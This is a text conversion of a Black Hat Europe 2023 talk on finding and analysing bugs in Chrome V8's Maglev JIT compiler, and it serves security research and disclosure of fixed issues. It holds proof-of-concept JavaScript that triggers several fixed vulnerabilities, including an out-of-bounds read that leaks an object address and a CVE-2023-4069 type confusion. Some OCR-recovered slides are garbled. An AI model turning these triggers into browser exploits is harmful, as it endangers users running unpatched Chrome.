---
title: "Reviving JIT Vulnerabilities Unleashing the Power of Maglev Compiler Bugs on Chrome Browser"
speakers: ["Bohan Liu", "Zheng Wang"]
conference: "Black Hat"
conference_full: "Black Hat Europe 2023"
edition: "Europe"
year: 2023
source_pdf: "Black Hat Europe 2023 slides/Bohan Liu, Zheng Wang_Reviving JIT Vulnerabilities Unleashing the Power of Maglev Compiler Bugs on Chrome Browser.pdf"
pages: 73
sha256: "febafaa08f38dd89a2b71603d9cb6419cf324ed015be4984486ad248ddf6802a"
text_chars: 43480
ocr_pages: 5
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:10:28Z"
---
# Reviving JIT Vulnerabilities Unleashing the Power of Maglev Compiler Bugs on Chrome Browser

**Speakers:** Bohan Liu, Zheng Wang  
**Conference:** Black Hat Europe 2023  
**Source:** `Black Hat Europe 2023 slides/Bohan Liu, Zheng Wang_Reviving JIT Vulnerabilities Unleashing the Power of Maglev Compiler Bugs on Chrome Browser.pdf` (73 pages)


## Slide 1

## Reviving JIT Vulnerabilities: Unleashing the Power of Maglev Compiler Bugs on Chrome Browser

Bohan Liu,  Zheng Wang Tencent Security Xuanwu Lab

#BHEU @BlackHatEvents

## Slide 2

#### Who are we

##### Bohan Liu

- @P4nda20371774

- • Security Researcher at Tencent Security Xuanwu Lab

- Mainly Engaged in Browser Security

- Google Chrome Bug Hunter

- • The top 20 of Chrome VRP Researchers in 2023

##### Zheng Wang

- @xmzyshypnc

- • Security Researcher at Tencent Security Xuanwu Lab

- Mainly Engaged in Browser Security and Kernel Security

- Found Several security bugs in Apple Safari, Linux kernel and VirtualBox

#BHEU @BlackHatEvents

## Slide 3

# _Introduction_

#BHEU @BlackHatEvents

## Slide 4

### Compilers

**AOT Compiler:** translates source code into machine code before the program is running

**JIT Compiler:** translates source code into machine code during runtime

#BHEU @BlackHatEvents

## Slide 5

### V8

###### **Overview:**

- l Used in Chrome and in Node.js l JavaScript and WebAssembly

- l Interpreter and JIT compiler

###### **Basic Compilation Process:**

- l Parsing l Generate bytecode

- l Optimize

#BHEU @BlackHatEvents

## Slide 6

### TurboFan

**Pipeline:**

- l Bytecode Grapph building l Inlining

- l Typer

- l TypedLowering

- l LoopPeeling

- l LoadElimination

- l Escape Analysis

- l Simplified Lowering

- l Untyper

- l Generic Lowering

- l EarlyOptimization

- l Schedule

- l Effect Linearization

- l StoreStore Elimination

- l Late Optimization

#BHEU @BlackHatEvents

## Slide 7

### V8 compilers

**Sparkplug:** Compile fast with low code quality

**TurboFan:** Compile slow(~100x speed gap) with high code quality

What if introduce another compiler to make trades-off Between them?

Maglev

#BHEU @BlackHatEvents

## Slide 8

### Why Maglev

**1. JIT compiler like Turbofan has High-quality vulnerabilities**

2. Bug Mitigation in Turbofan are Increasingly robust

3. The development iteration rate of Maglev is very high, and it shares many similarities with Turbofan

#BHEU @BlackHatEvents

## Slide 9

### Why Maglev

1. JIT compiler like Turbofan has High-quality vulnerabilities

**2. Bug Mitigation in Turbofan are Increasingly robust**

3. The development iteration rate of Maglev is very high, and it shares many similarities with Turbofan

#BHEU @BlackHatEvents

## Slide 10

### Why Maglev

1. JIT compiler like Turbofan has High-quality vulnerabilities

2. Bug Mitigation in Turbofan are Increasingly robust

**3. The development iteration rate of Maglev is very high, and it shares many similarities with Turbofan**

#BHEU @BlackHatEvents

## Slide 11

# _Maglev Compiler_

#BHEU @BlackHatEvents

## Slide 12

### Maglev

###### **Overview:**

Maglev is a mid-tier **_SSA-based_** optimising compiler between sparkplug and turbofan.

###### **Goals:**

- Faster than turbofan for its simple IR design and optimization system

- Better code quality than sparkplug for optimization

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Register  Code
Allocation Generation

###### **_Compiling Phases_**

Deoptimization

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 13

### SSA & Phi

###### **SSA:**

Static single assignment form (SSA) is a property of an intermediate representation (IR) that requires each variable to be assigned exactly once and defined before it is used.

**Phi(** _Φ_ **):**

Generate a new definition by "choosing" either _y_ 1 or _y_ 2, depending on the control flow in the past.

#BHEU @BlackHatEvents

## Slide 14

### Graph Building

- l Turn bytecode to SSA nodes

- l Create Phi Nodes Loop & Try/Catch

- l Split Nodes into basic blocks

- l Store a snapshot copy of the interpreter frame

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Register  Code
Allocation Generation

- l Inlining

###### **_Compiling Phases_**

Deoptimization

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 15

### Representation Selecting

All phi node will be tagged after graph building

Motivation : In some cases, v8 has to do unnecessary tag and untag operations

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Register  Code
Allocation Generation

###### **_Compiling Phases_**

Deoptimization

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 16

### Representation Selecting

Phi Untagging : remove the tagging of some phis based on their input and output representation.

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Register  Code
Allocation Generation

###### **_Compiling Phases_**

Deoptimization

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 17

### Register Allocation pre-processing

- l Dead code marking and removing

- l Collect input/output location constraints

- l Find the maximum number of stack arguments passed to calls

- l Collect use information, for SSA liveness and nextuse distance

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Register  Code
Allocation Generation

###### **_Compiling Phases_**

Deoptimization

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 18

### Register Allocation

- l Compute post dominating Holes which will break linear scan algorithm

- l Allocate registers and stack_slot for nodes, use cached values for fast execution

- l Merge registers on basic block merge point

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Register  Code
Allocation Generation

###### **_Compiling Phases_**

Deoptimization

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 19

### Code Generation

###### Generate code with the “template” of each Node

Process the graph, emit deferred code and build depot exits

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Register  Code
Allocation Generation

###### **_Compiling Phases_**

Deoptimization

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 20

### Deoptimization

- Store the context snapshot at every Deoptimization point

- Materialize the JSObject according to FrameState using the snapshot.

- Jump to bytecode position with unoptimized state using depot label.

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Register  Code
Allocation Generation

###### **_Compiling Phases_**

Deoptimization

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 21

### Maglev VS TurboFan

**IR** : TF-IR is based on Sea-of-nodes while ML-IR is based on SSA node **Optimization** : Both have inlining. ML prefers to mutate/annotate node while TF reduces node by lowering the nodes from high level to low level

**Deoptmization** : Both have deopt system. Using frame state to copy the context for restore.

**Others** : ML creates phi for exception handler and loop, untag some phis on demand and TF has powerful typer system.

#BHEU @BlackHatEvents

## Slide 22

### Maglev VS TurboFan

###### Shared Attack Surface

1. Register Allocation 2. Inline 3. Deoptimization

###### Unique Attack Surface

1. Phi untag 2. Special deoptimization design 3. Special Structure like Try-catch、Loop related issue

#BHEU @BlackHatEvents

## Slide 23

# _Vulnerability Discovery_

#BHEU @BlackHatEvents

## Slide 24

### Overview

Reviewing the Old to Understand the New : Borrow the experience from Vulnerability Research on Turbofan **Crash-based fuzzer** : fuzzilli、DIE **Differential fuzzer** : fuzzJIT、JIT picker **Code Review Helpers** : Codeql

#BHEU @BlackHatEvents

## Slide 25

### Crash-based fuzzer

1. Enable component support in fuzzer

2. Add specific templates to the fuzzer

3. Switch to other architectures for adaptation like arm and arm64

#BHEU @BlackHatEvents

## Slide 26

### Differential fuzzer

Enable component support in JIT picker and add special templates

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
Differential fuzzer
Enable component support in JIT picker and add special
templates
@@ -240,6 +274,8 @@ let v8Profile = Profile
"--harmony-rab-gsab",
"--allow-natives-syntax",
"--interrupt-budget=1000",
"--maglev",
"--stress-maglev",
"--fuzzing"
Fuzzer Statistics
Fuzzer phase: Fuzzing (with MutationEngine)
Uptime: 4d 16h 20m Os
Total Samples: 25115
Interesting Samples Found: 2125
Last Interesting Sample: Od Oh 5m 40s
Valid Samples Found: 16519
Corpus Size: 2125
Correctness Rate: 72.10% (65.77%)
Timeout Rate: 12.30% (5.59%)
Crashes Found: 62
Differentials Found: 11
Timeouts Hit: 1404
Coverage: 12.32%
Avg. program size: 876.63
Avg. corpus program size: 822.16
Connected workers: 0
Execs / Second: 3.01
Fuzzer Overhead: 0.83%
Total Execs: 2015730
Differential Tests: 16544
if differentialTesting {
@@ -297,9 +333,13 @@ let v8Profile = Profile
5
codeSuffix: """
gc();
gc();
}
%NeverOptimizeFunction(main) ;
%PrepareFunctionForOptimization(main) ;
main();
%OptimizeMaglevOnNextCall (main) ;
main();
2
```

## Slide 27

### Code Review Helpers

Find interesting vulnerability patterns and write ql to query them

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
Code Review Helpers
Find interesting vulnerability patterns and write ql to query them
and fc.getEnclosingFunction() = f
and fc.getTarget().getName().toString() = "MakeDeferredCode"
ETare|
(exists(
LambdaExpression cb, Operator op |
cb = fc.getArgument(@)
and op = cb.getLambdaFunction()
and runtime_call.getEnclosingFunction() = op
and runtime_call.getTarget().getName().toString().toLowerCase().regexpMatch(".*call.*")
Expr func_expr, Function defer_f |
func_expr = fc.getArgument(@)
and defer_f.getName().toString() = func_expr.toString()
and runtime_call.getEnclosingFunction() = defer_f
and runtime_call.getTarget().getName().toString().toLowerCase().regexpMatch(".*call.*")
»)
```

## Slide 28

### Timeline

Here is the timeline of bug hunting:

Announce Maglev
offcially
Jun 2
First
maglev
Maglev first commit Cluster fuzzer support for
Feb 24 RCE bug in
maglev
Sep 1 stable by
ManYueM
Jul 17 o
2022 2023
2022 Feb Apr Jun Aug Oct Dec Feb Apr Jun 2023
Mar 16
First Maglev
Try to enable maglev
RCE bug
support in our fuzzer Maglev support real
Sep 9
work in our fuzzer
#BHEU @BlackHatEvents
Sep 6

## Slide 29

### Debug

Turbofan Debugging : Turbolizer will display sea of nodes. It can used to trace node Creation and reduction

###### Maglev Debugging:

--print-maglev-graphs :  print magle node and basic block information --trace-maglev-phi-untagging : trace the pass of Phi untagging --trace-maglev-regalloc ： trace register allocation

#BHEU @BlackHatEvents

## Slide 30

# _Cases Study_

#BHEU @BlackHatEvents

## Slide 31

#### Attack Surface in Maglev

**1. Graph Building:** Bytecode  ->  IR.

**2. Representation Selecting** : Untagging.

**3. Register Allocation pre-processing** : Preprocessing for next steps.

**4. Register Allocation:** Spill a slot location and cache its value in register.

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Issue 1384369 /  1465326 Issue 1423610
Register  Code
Allocation Generation
Issue 1368046 / 1410970

**5. Code Generation:** Generate code.

###### **_Compiling Phases_**

**6. Deoptimization** : Bail out.

Deoptimization
Issue 1381335 / 1500857

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 32

#### Bugs in MaglevGraphBuilder

###### **What does MaglevGraphBuilder do ?**

- Create basic block

- Add Node to basic block

- Reduce some complex built-in call

###### **How to reduce the calls?**

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Issue 1384369 /  1465326 Issue 1423610
Register  Code
Allocation Generation
Issue 1368046 / 1410970

###### **How to find bugs in Reducing calls?**

**_Compiling Phases_**

Deoptimization
Issue 1381335 / 1500857

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 33

#### Issue 1384369

**_What does CheckInt32Condition generate?_**

**_Code in Maglev_**

**_Code in Runtime_**

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
OE Ni ee af
piSekhat eM a
EUROPE 2@O0es
Issue 1384369
ransitioning macro G@h@hateStringAn (implicit context: Context) ( ValueNode* MaglevGraphBuilder: : TryReduceStringPrototypeCharCodeAt
receiver: JSAny, position: JSAny, compiler: :JSFunctionRef target, CallArguments& args)
methodName: constexpr string): never labels ValueNode* receiver = GetTaggedOrUndefined(args.receiver());
IfInBounds(String, uintptr, uintptr), IfOutOfBounds { ValueNode* index;
if (args.count() ==
string: String = ToThisString(receiver, methodName) ; index GetInt32Constant(Q);
} else {
index GetInt32ElementIndex(args[0]);
st indexNumber: Number = ToInteger_Inline(position) ; (arg 1);
»Switch (indexNumber) BuildCheckString( receiver
case (indexSmi: Smi): {
const length: uintptr =_string,. length uintptr: ValueNode* length = AddNewNode<StringLength>({receiver}) ;
onst index: uintptr =|Unsigned(Convert<intptr>(indexSmi) ) ; AddNewNode<CheckInt32Condition>({index, length}, AssertCondition::kLess,
DeoptimizeReason: : kOutOfBounds) ;
return AddNewNode<BuiltinStringPrototypeCharCodeAt>({receiver, index});
StaticAssertStringLengthFitsSmi ( ) ;
if (index >= length) goto IfOutOfBounds;
goto IfInBounds(string, index, length);
} What does CheckInt32Condition generate?
case (indexHeapNumber: HeapNumber): {
dcheck(IsNumberNormalized(indexHeapNumber) ) ;
goto IfOutOfBounds;
}
Code in Runtime Code in Maglev
```

## Slide 34

#### Issue 1384369

void CheckInt32Condition::GenerateCode(MaglevAssembler* masm, const ProcessingState& state) {

__ cmpq(ToRegister(left_input()), ToRegister(right_input()));

__ EmitEagerDeoptIf( **NegateCondition(ToCondition(condition_))** , reason_, this);

}

template <typename NodeT> inline void MaglevAssembler::EmitEagerDeoptIf(Condition cond,

DeoptimizeReason reason, NodeT* node) {

static_assert(NodeT::kProperties.can_eager_deopt()); RegisterEagerDeopt(node->eager_deopt_info(), reason); RecordComment("-- Jump to eager deopt"); **j(cond, node->eager_deopt_info()->deopt_entry_label());**

}

**_Go to eager deoptimize_**

**_Code in Maglev_**

#BHEU @BlackHatEvents

## Slide 35

#### Issue 1384369

const obj1 = [13.37,13.37,13.37,13.37]; function foo() { const v6 = "2".charCodeA t(-1073741824) ; for (const j in obj1) { **_// Never goto deoptimize here_** } for (const k of "search") { }

} for (let i = 0; i < 100; i++) { foo(); }

**_What if using a negative index?_**

**_Only Out-Of-Bounds read one byte?_**

#BHEU @BlackHatEvents

## Slide 36

#### Issue 1384369

const obj = [] const str = "p4nda" **_// Allocated at V8 OldSpace when compiling_** const obj1 = [13.37,13.37,str,obj]; **_// Allocated at V8 NewSpace when Runtime_** %DebugPrint(obj);

function foo() { const v7 = str.charCodeAt(-0x14e2f0+0xb); const v8 = str.charCodeAt(-0x14e2f0+0xa); **_// continuous reading or searching via a same String_** const v9 = str.charCodeAt(-0x14e2f0+0x9); const v10 = str.charCodeAt(-0x14e2f0+0x8); for (const j in obj1) { } for (const k of "search") { } return [v7,v8,v9,v10] } for (let i = 0; i < 100; i++) { foo(); } x = foo(); leak = 0; for(var i = 0 ;i <x.length;i++){ leak = leak << 8; leak += x[i]; }

console.log("addr of obj :",leak.toString(16))

Fix: https://chromium.googlesource.com/v8/v8/+/fc1b4c83d4ec271cab06daf3f52e170068e2085c

#BHEU @BlackHatEvents

## Slide 37

#### Issue 1465326

class A {}

- **A RCE bug fixed in Chrome 115.0.5790.170 as CVE-2023-4069**

var x = Function;

- **Found by** _Man Yue Mo of GitHub Security Lab_

- **Type Confusion when constructing a Class both have target and newTarget.**

class B extends A { constructor() { x = new.target; super();

}

} function construct() { return Reflect.construct(B, [], Function); } for (let i = 0; i < 2000; i++) construct(); var arr = construct(); console.log(arr.prototype);

Ref: https://github.blog/2023-10-17-getting-rce-in-chrome-with-incomplete-object-initialization-in-the-maglev-compiler/

#BHEU @BlackHatEvents

## Slide 38

#### Issue 1465326

**_1_**

Where is the CHECK?
new_target.initial_map.constructor==target

3

**_Code in Maglev_**

**_Code in Runtime_**

#BHEU @BlackHatEvents

## Slide 39

#### Issue 1465326

**_Use Of Uninitialized_**

**_Code in Maglev_**

#BHEU @BlackHatEvents

**_Code in Maglev_**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
a Be ogi
black hat SS Pas
EUROPE 2@O0es
FastObject: :FastObject(compiler::JSFunctionRef constructor, Zone* zone,
compiler: :JSHeapBroker* broker)
: map(gonstructor.initial_map(broker)) {
issue A 465326 compiley: :SlackTrackingPrediction prediction =
brgéker->dependencies() ->DependOnInitialMapInstanceSizePrediction(
constructor) ;
inoject_properties = prediction.inobject_property_count();
ingtance_size = prediction.instance_size();
fAelds = zone->NewArray<FastField>(inobject_properties) ;
ClearFields();
elements = FastFixedArray();
void MaglevGraphBuilder: :VisitFindNonDefaultConstructorOrConstruct
ValueNode* this function = LoadRegisterTagged (0) ;
ValueNode* new_target = LoadRegisterTagged(1) ;
auto register pair = iterator _.GetRegisterPairOperand(2) ;
if (compiler: :OptionalHeapObjectRef constant =
TryGetConstant(this function) )
compiler: :MapRef function map = constant->map(broker());
compiler: :HeapObjectRef current = function_map.prototype(broker());
ValueNode* MaglevGraphBuilder: :BuildAllocateFast0bject
FastObject object, AllocationType allocation type) {
SmallZoneVector<ValueNode*, 8> properties(object.inobject_properties, zone());
for (int i = 0; i < object.inobject_properties; ++i) {
properties[i] = BuildAllocateFastObject(object.fields[i], allocation type);
if (broker()->dependencies()->DependOnArrayIteratorProtector()) {
while (true) {
FunctionKind kind = current_function.shared(broker()).kind();
if (kind != FunctionKind: :kDefaultDerivedConstructor)
broker() ->dependencies() ->DependOnStablePrototypeChain(
function map, WhereToStart::kStartAtReceiver, current_function) ;
ValueNode* elements =
BuildAllocateFastObject(object.elements, allocation type)
compiler: :OptionalHeapObjectRef new target function =
TryGetConstant (new target) ;
if (kind == FunctionKind::kDefaultBaseConstructor) {
ValueNode* object;
if _(new_target_ function & new target function->IsjJSFunction()) {
object = BuildAllocateFastUbject
DCHECK(object.map.IsJSObjectMap()) ;
IDC ks) ca 1
ValueNode* allocation = Extend0rReallocateCurrentRawAllocation
object.instance size, allocation type);
BuildStoreReceiverMap(allocation, object.map) ;
AddNewNode<StorelaggedFieldNoWriteBarrier>
FastObject(new_target_function->AsJSFunction(), zone(), {allocation, GetRootConstant (RootIndex: :kEmptyFixedArray) }
broker()), JSObject: :kPropertiesOrHashOffset) ;
AllocationType: :kYoung) ; if (object.js_array_length.has value()) {
else { BuildStoreTaggedField(allocation, GetConstant(*object.js_ array length),
object = BuildCallBuiltin<Builtin: : kFastNewObject>(
{GetConstant(current_function), new_target}) ;
JsArray::kLengthOffset) ;
StoreRegister(register pair.first, GetBooleanConstant(true) );
StoreRegister(register_pair.second, object);
return;
}
break;
BuildStoreTaggedField(allocation, elements, JSObject::kElementsOffset) ;
for (int i = 0; i < object.inobject_properties; ++i) {
BuildStoreTaggedField(allocation, properties[i],
object.map.GetInObjectPropertyOffset(i));
return allocation;
Code in Maglev
```

## Slide 40

#### Similar bug in other JIT compiler

- **Issue 1024758 / CVE-2019-13728**

- **Found by** _Rong Jian and GuangGong of Alpha Lab, Qihoo 360_

- **_Lack A CHECK when inlining RegExp.prototype.test_**

- **_In Turbofan._**

ref: https://bugs.chromium.org/p/chromium/issues/detail?id=1024758

#BHEU @BlackHatEvents

## Slide 41

#### Bugs in StraightForwardRegisterAllocator

**What does StraightForwardRegisterAllocator do ?**

- Spill slot location for Each Node

- Cache the value in register for faster execution

- Schedule the Use of registers based on Node lifetime

###### **Similar bug in other JIT compiler**

- Issue 1296876

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Issue 1384369 /  1465326 Issue 1423610
Register  Code
Allocation Generation
Issue 1368046 / 1410970

**Are there any register allocation collision cases?**

**_Compiling Phases_**

Deoptimization
Issue 1381335 / 1500857

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 42

#### Issue 1368046

function f(arg0, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11) { for (let i = 0; i < 0; i++) {} try {

throw 547397793; } catch (e) { }

}

%PrepareFunctionForOptimization(f); f(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 547397793); f(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 547397793); %OptimizeMaglevOnNextCall(f); f(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 547397793);

#BHEU @BlackHatEvents

## Slide 43

#### Issue 1368046

void RecordMoves(const MaglevCompilationUnit& unit, BasicBlock* block, const CompactInterpreterFrameState* register_frame) { for (Phi* phi : *block->phis()) {

- // ...

class ExceptionHandlerTrampolineBuilder {

void EmitTrampolineFor(NodeBase* node) { DCHECK(node->properties().can_throw());

ExceptionHandlerInfo* handler_info = node->exception_handler_info(); DCHECK(handler_info->HasExceptionHandler());

BasicBlock* block = handler_info->catch_block.block_ptr(); LazyDeoptInfo* deopt_info = node->lazy_deopt_info();

- }

- }

ValueNode* value = register_frame->GetValueOf(phi->owner(), unit); DCHECK_NOT_NULL(value);

switch (value->properties().value_representation()) { case ValueRepresentation::kTagged:

// All registers should have been spilled due to the call. DCHECK(!value->allocation().IsRegister()); **direct_moves_.emplace_back(phi->result(), value);**

break;

case ValueRepresentation::kInt32:

/// [...]

__ bind(&handler_info->trampoline_entry); ClearState();

}

- }

// TODO(v8:7700): Handle inlining.

- **RecordMoves(deopt_info->unit, block, deopt_info->state.register_frame);** // We do moves that need to materialise values first, since we might need to

// call a builtin to create a HeapNumber, and therefore we would need to // spill all registers. DoMaterialiseMoves();

// Move the rest, we will not call HeapNumber anymore. **DoDirectMoves();**

// Jump to the catch block.

__ jmp(block->label());

**_What if any collision between src and dst?_**

void DoDirectMoves() {

for (auto& [target, value] : direct_moves_) {

if (value->allocation().IsConstant()) {

if (Int32Constant* constant = value->TryCast<Int32Constant>()) { EmitMove(target, Smi::FromInt(constant->value()));

} else {

// Int32 and Float64 constants should have already been dealt with. DCHECK_EQ(value->properties().value_representation(), ValueRepresentation::kTagged); EmitConstantLoad(target, value); } } else { **EmitMove(target, ToMemOperand(value));** } } }

#BHEU @BlackHatEvents

## Slide 44

#### Issue 1368046

###### **_Dst :        Src_**

**_Sea of Node in Maglev_**

**_Location in Block b6 vs location in FrameState_**

#BHEU @BlackHatEvents

## Slide 45

#### Issue 1368046

**_V45 V47_**

**_Stack:1 was overwrite!_**

**_Location in Block b6 vs location in FrameState_**

**_Assembly code generated by maglev_**

#BHEU @BlackHatEvents

## Slide 46

#### Issue 1368046

**_Type Confusion_**

**_Sea of Node in Maglev_**

fix: https://chromium.googlesource.com/v8/v8/+/5646b9c3c0edb2d688603c3de72c382018d449a6

#BHEU @BlackHatEvents

## Slide 47

#### Issue 1410970

const obj3 = [13.37,13.37,13.37,13.37]; let obj4 = 1; function obj5(obj6,obj7,obj8,obj9) { for (const obj10 of obj3) { const obj15 = [undefined,undefined,undefined,"foo"]; let obj16 = 0; function obj17() { const obj18 = obj16++; const obj22 = Math.ceil(); obj4 = obj22; } const obj23 = obj15.findIndex(obj17); const obj25 = [1337,1337,1337,1337,1337]; const obj28 = [1024,2,0]; for (const obj29 of obj28) { const obj32 = [1,2,obj23]; for (const obj33 of obj32) { const obj36 = [1,obj25,3]; for (const obj37 of obj36) { const obj38 = obj29 < obj33; const obj39 = obj10 !== obj7; } } } } } for(var i = 0 ;i <0x3000;i++) { const obj40 = obj5(); }

**_The loop?_**

#BHEU @BlackHatEvents

## Slide 48

#### Issue 1410970

void AttemptOnStackReplacement(MaglevAssembler* masm, void BaselineAssembler::TryLoadOptimizedOsrCode(Register ZoneLabelRef no_code_for_osr, scratch_and_result, JumpLoopPrologue* node, Register Register scratch0, feedback_vector, Register scratch1, int32_t loop_depth, FeedbackSlot slot, FeedbackSlot feedback_slot, Label* on_result, BytecodeOffset osr_offset) { Label::Distance) { Label fallthrough, clear_slot; **baseline::BaselineAssembler basm(masm);** LoadTaggedPointerField(scratch_and_result, feedback_vector, __ AssertFeedbackVector(scratch0); FeedbackVector::OffsetOfElementAt(slot.ToInt() )); // Case 1). __ LoadWeakValue(scratch_and_result, scratch_and_result, Label deopt; &fallthrough); Register maybe_target_code = scratch1; { // Is it marked_for_deoptimization? If yes, clear the slot. **basm.TryLoadOptimizedOsrCode** (maybe_target_code, scratch0, { feedback_slot, &deopt, Label::kFar); **ScratchRegisterScope temps(this);** } **__ JumpIfCodeIsMarkedForDeoptimization(scratch_and_result, temps.AcquireScratch(),** // Case 2). **&clear_slot);** __ LoadByte(scratch0, __ B(on_result); FieldMemOperand(scratch0, } FeedbackVector::kOsrStateOffset)); // […] __ DecodeField<FeedbackVector::OsrUrgencyBits>(scratch0); } basm.JumpIfByte(kUnsignedLessThanEqual, scratch0, loop_depth, *no_code_for_osr, Label::kNear); //[...] **_How does the Maglev optimize further?_** }

#BHEU @BlackHatEvents

## Slide 49

#### Issue 1410970

class BaselineAssembler::ScratchRegisterScope { public:

explicit ScratchRegisterScope(BaselineAssembler* assembler) : assembler_(assembler),

prev_scope_(assembler->scratch_register_scope_), wrapped_scope_(assembler->masm()) { if (!assembler_->scratch_register_scope_) { // If we haven't opened a scratch scope yet, for the first one

void MacroAssembler::JumpIfCodeIsMarkedForDeoptimization( Register code, Register scratch, Label* if_marked_for_deoptimization) {

**Ldr(scratch.W()** , FieldMemOperand(code, **//overwrite the scratch register** Code::kKindSpecificFlagsOffset));

Tbnz(scratch.W(), InstructionStream::kMarkedForDeoptimizationBit, if_marked_for_deoptimization); }

add a

// couple of extra registers. **wrapped_scope_.Include(x14, x15); wrapped_scope_.Include(x19);** } assembler_->scratch_register_scope_ = this; } ~ScratchRegisterScope() { assembler_->scratch_register_scope_ = prev_scope_; }

###### **_Are the assumption universal?_**

Register AcquireScratch() { return wrapped_scope_.AcquireX(); }

private: BaselineAssembler* assembler_; ScratchRegisterScope* prev_scope_; UseScratchRegisterScope wrapped_scope_;

};

#BHEU @BlackHatEvents

## Slide 50

#### Issue 1410970

class BaselineAssembler::ScratchRegisterScope { void MacroAssembler::JumpIfCodeIsMarkedForDeoptimization( public: Register code, Register scratch, Label* explicit ScratchRegisterScope(BaselineAssembler* assembler) if_marked_for_deoptimization) { : assembler_(assembler), **Ldr(scratch.W()** , FieldMemOperand(code, prev_scope_(assembler->scratch_register_scope_), Code::kKindSpecificFlagsOffset)); wrapped_scope_(assembler->masm()) { if (!assembler_->scratch_register_scope_) { if_marked_for_deoptimization); // If we haven't opened a scratch scope yet, for the first one } add a // couple of extra registers. **wrapped_scope_.Include(x14, x15);** **_Are the assumption universal?_ wrapped_scope_.Include(x19);** } assembler_->scratch_register_scope_ = this; } ~ScratchRegisterScope() { assembler_->scratch_register_scope_ = prev_scope_; } Register AcquireScratch() { return wrapped_scope_.AcquireX(); }

void MacroAssembler::JumpIfCodeIsMarkedForDeoptimization( Register code, Register scratch, Label* if_marked_for_deoptimization) { **Ldr(scratch.W()** , FieldMemOperand(code, **//overwrite the scratch register** Code::kKindSpecificFlagsOffset));

Tbnz(scratch.W(), InstructionStream::kMarkedForDeoptimizationBit, if_marked_for_deoptimization);

private: BaselineAssembler* assembler_; ScratchRegisterScope* prev_scope_; UseScratchRegisterScope wrapped_scope_;

};

#BHEU @BlackHatEvents

## Slide 51

#### Issue 1410970

class BaselineAssembler::ScratchRegisterScope { public: explicit ScratchRegisterScope(BaselineAssembler* assembler) : assembler_(assembler), prev_scope_(assembler->scratch_register_scope_), wrapped_scope_(assembler->masm()) { if (!assembler_->scratch_register_scope_) { // If we haven't opened a scratch scope yet, for the first one add a // couple of extra registers. **wrapped_scope_.Include(x14, x15); wrapped_scope_.Include(x19);** } assembler_->scratch_register_scope_ = this; } ~ScratchRegisterScope() { assembler_->scratch_register_scope_ = prev_scope_; } Register AcquireScratch() { return wrapped_scope_.AcquireX(); } private:

void MacroAssembler::JumpIfCodeIsMarkedForDeoptimization( Register code, Register scratch, Label* if_marked_for_deoptimization) {

**Ldr(scratch.W()** , FieldMemOperand(code, **//overwrite the scratch register** Code::kKindSpecificFlagsOffset));

Tbnz(scratch.W(), InstructionStream::kMarkedForDeoptimizationBit, if_marked_for_deoptimization);

}

**_Are the assumption universal?_**

BaselineAssembler* assembler_; ScratchRegisterScope* prev_scope_; UseScratchRegisterScope wrapped_scope_;

};

#BHEU @BlackHatEvents

## Slide 52

#### Issue 1410970

class BaselineAssembler::ScratchRegisterScope { void MacroAssembler::JumpIfCodeIsMarkedForDeoptimization( public: Register code, Register scratch, Label* explicit ScratchRegisterScope(BaselineAssembler* assembler) if_marked_for_deoptimization) { : assembler_(assembler), **Ldr(scratch.W()** , FieldMemOperand(code, **//overwrite the scratch register** prev_scope_(assembler->scratch_register_scope_), Code::kKindSpecificFlagsOffset)); wrapped_scope_(assembler->masm()) { Tbnz(scratch.W(), InstructionStream::kMarkedForDeoptimizationBit, if (!assembler_->scratch_register_scope_) { if_marked_for_deoptimization); // If we haven't opened a scratch scope yet, for the first one } add a // couple of extra registers. **wrapped_scope_.Include(x14, x15);** **_Are the assumption universal?_ wrapped_scope_.Include(x19);** } assembler_->scratch_register_scope_ = this; } ~ScratchRegisterScope() { assembler_->scratch_register_scope_ = prev_scope_; } Register AcquireScratch() { return wrapped_scope_.AcquireX(); } **_Type Confusion_** private: BaselineAssembler* assembler_; ScratchRegisterScope* prev_scope_; UseScratchRegisterScope wrapped_scope_; };

Fix: https://chromium.googlesource.com/v8/v8/+/12ecfa78cd57978caebda77ef40309ce89b97d8b

#BHEU @BlackHatEvents

## Slide 53

#### Bugs in Deoptimization

###### **What does Deoptimization do ?**

- Store the context snapshot at every Deoptimization point

- Materialize the JSObject according to FrameState using the snapshot.

- Jump to bytecode position with unoptimized state.

###### **Similar bug in other JIT compiler:**

Register
Graph Representation
Allocation
Building Selecting
pre-processing
Issue 1384369 /  1465326 Issue 1423610
Register  Code
Allocation Generation
Issue 1368046 / 1410970

- Issue 1016450

- Issue 1028191

**_Compiling Phases_**

- Issue 1029530

- Issue 1084820

- **Any difference between deoptimization issue in Turbofan and Maglev?**

Deoptimization
Issue 1381335 / 1500857

**_Runtime_**

#BHEU @BlackHatEvents

## Slide 54

